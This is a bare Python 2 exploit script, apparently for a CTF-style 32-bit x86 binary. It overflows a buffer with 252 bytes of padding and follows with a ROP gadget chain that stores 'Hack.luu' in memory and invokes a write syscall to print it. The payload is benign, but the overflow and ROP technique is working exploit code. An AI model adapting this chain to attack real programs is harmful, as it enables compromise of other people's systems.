#!/usr/bin/env python

from struct import pack
 
junk = "A" * 252

## ROP gadgets ##
p = ''
p += pack('<I', 0x0806ee2a) # pop edx ; ret
p += pack('<I', 0x080ea060) # @ .data
p += pack('<I', 0x080bae96) # pop eax ; ret
p += 'Hack'
p += pack('<I', 0x0809a1ed) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0806ee2a) # pop edx ; ret
p += pack('<I', 0x080ea064) # @ .data + 4
p += pack('<I', 0x080bae96) # pop eax ; ret
p += '.luu'
p += pack('<I', 0x0809a1ed) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0806ee2a) # pop edx ; ret
p += pack('<I', 0x080ea067) # @ .data + 5
p += pack('<I', 0x08054850) # xor eax, eax ; ret
p += pack('<I', 0x0809a1ed) # mov dword ptr [edx], eax ; ret

p += pack('<I', 0x0806ee51) # pop ecx ; pop ebx ; ret
p += pack('<I', 0x080ea060) # @ .data
p += pack('<I', 0x42424242) # junk

p += pack('<I', 0x08058aaf) # xor eax, eax ; pop ebx ; ret
p += pack('<I', 0xffffffff)
p += pack('<I', 0x080da449) # inc ebx ; ret
p += pack('<I', 0x080da449) # inc ebx ; ret
p += pack('<I', 0x0807b87f) # inc eax ; ret
p += pack('<I', 0x0807b87f) # inc eax ; ret
p += pack('<I', 0x0807b87f) # inc eax ; ret
p += pack('<I', 0x0807b87f) # inc eax ; ret

p += pack('<I', 0x0806ee2a) # pop edx ; ret
p += pack('<I', 0xffffffff)
p += pack('<I', 0x0805d667) # inc edx ; ret
p += pack('<I', 0x0805d667) # inc edx ; ret
p += pack('<I', 0x0805d667) # inc edx ; ret
p += pack('<I', 0x0805d667) # inc edx ; ret
p += pack('<I', 0x0805d667) # inc edx ; ret
p += pack('<I', 0x0805d667) # inc edx ; ret
p += pack('<I', 0x0805d667) # inc edx ; ret
p += pack('<I', 0x0805d667) # inc edx ; ret

p += pack('<I', 0x080494a1) # int 0x80

payload = junk + p
print payload
